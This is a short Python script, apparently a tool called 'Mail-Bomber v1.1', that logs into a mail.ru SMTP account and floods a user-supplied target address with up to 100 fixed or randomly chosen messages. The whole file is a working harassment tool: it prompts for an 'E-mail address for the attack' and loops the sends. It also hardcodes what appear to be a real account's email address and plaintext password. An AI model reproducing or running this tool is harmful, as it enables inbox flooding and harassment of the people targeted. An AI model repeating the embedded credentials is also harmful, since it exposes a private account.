import smtplib as smtp
import time as t
import Hello as Txt
from validate_email import validate_email
from colorama import Fore, init
import random as rand

init()

sent = open('sentences', 'r')
i = 0
enter = False
random = False
sent_arr = []
email = "SashaGorbachev1992@mail.ru"
password = "7ZGACQZm"

for line in sent:
    sent_arr.append(line)

# Логотип
Txt.Red_Text('Mail-Bomber v1.1 by ', 0)
Txt.Green_Text('AIV', 0)
print()
Txt.Yellow_Text('All data must be entered in ', 0)
Txt.Green_Text('English!', 0)
print(end='\n\n')

# Сбор данных
Txt.Blue_Text('E-mail address for the attack: ', 0)
dest_email = input()
mailCheck = validate_email(dest_email)
while not mailCheck:
    Txt.Red_Text('Try again: ', 0)
    dest_email = input()
    mailCheck = validate_email(dest_email)

Txt.Yellow_Text('Text (max 100) | (rand_msg - random messages): ', 0)
email_text = input()
if email_text == 'rand_msg':
    random = True
    Txt.Green_Text('Random-Mode: On', i)
    print()


while len(email_text) == 0 or len(email_text) > 100:
    Txt.Red_Text('Try again: max 100 or rand_msg: ', 0)
    email_text = input()

Txt.Yellow_Text('Amount (0-100): ', 0)
amount = input()

while int(amount) == 0 or int(amount) > 100:
    Txt.Red_Text('Try again (0-100): ', 0)
    amount = input()

# Подключение к майлу
print(Fore.RED + 'Loading..')

server = smtp.SMTP_SSL('smtp.mail.ru', 465)
server.ehlo()
server.login(email, password)
message = 'From: {}\nTo: {}\n\n{}'.format(email, dest_email, email_text)

# Отправка сообщений
while i < int(amount):
    if random:
        email_text = sent_arr[rand.randint(0, len(sent_arr)-1)]
        message = 'From: {}\nTo: {}\n\n{}'.format(email, dest_email, email_text)
    server.sendmail(email, dest_email, message)
    print(Fore.GREEN + '[+] Successfully sent to the: ', Fore.RED + dest_email)
    i = i + 1
    print(Fore.YELLOW + '[!] Mails left: ', int(amount) - i)
    t.sleep(3)
server.quit()

Txt.Green_Text('All mails were sent. The program is turned off!', 0)
